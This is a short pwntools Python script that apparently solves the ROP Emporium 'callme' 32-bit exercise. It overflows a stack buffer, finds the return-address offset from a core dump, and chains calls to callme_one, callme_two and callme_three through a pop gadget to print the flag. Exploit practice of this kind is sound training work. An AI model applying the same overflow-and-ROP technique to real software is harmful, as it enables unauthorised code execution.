#!/usr/bin/env python3

from pwn import *

exe = ELF("callme32_patched")
libc = ELF("./libcallme32.so")

context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    payload = cyclic(100)

    r.sendlineafter(b'>', payload)
    r.wait()
    core = r.corefile
    eip_value = core.eip
    eip_offset = cyclic_find(eip_value)

    r = conn()

    pop3 = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])[0]
    payload = flat(b'A'*eip_offset, exe.symbols.callme_one, pop3, 0xdeadbeef, 0xcafebabe, 0xd00df00d, exe.symbols.callme_two, pop3, 0xdeadbeef, 0xcafebabe, 0xd00df00d, exe.symbols.callme_three, pop3, 0xdeadbeef, 0xcafebabe, 0xd00df00d)

    r.sendlineafter(b'>', payload)
    
    r.recvline()
    r.recvline()
    r.recvline()
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
